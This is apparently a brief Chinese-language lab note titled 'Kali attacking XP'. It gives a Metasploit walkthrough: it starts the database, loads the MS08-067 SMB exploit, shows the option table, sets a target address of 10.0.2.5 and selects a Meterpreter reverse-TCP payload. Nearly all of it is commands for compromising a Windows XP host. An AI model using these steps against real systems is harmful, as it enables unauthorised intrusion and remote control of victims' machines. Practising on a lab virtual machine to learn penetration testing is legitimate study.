## Kali攻擊XP

<service postgresql start>先導入攻擊資料庫

<msfconsole>開啟攻擊面板
  
<use windows/smb/ms08_067_netapi>使用的漏洞

<show options>檢查設定
  
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

<set RHOSTS 10.0.2.5>設定欲攻擊的IP

<check>檢查是否有導入
 
<set payload windows/meterpreter/reverse_tcp>

<show options>
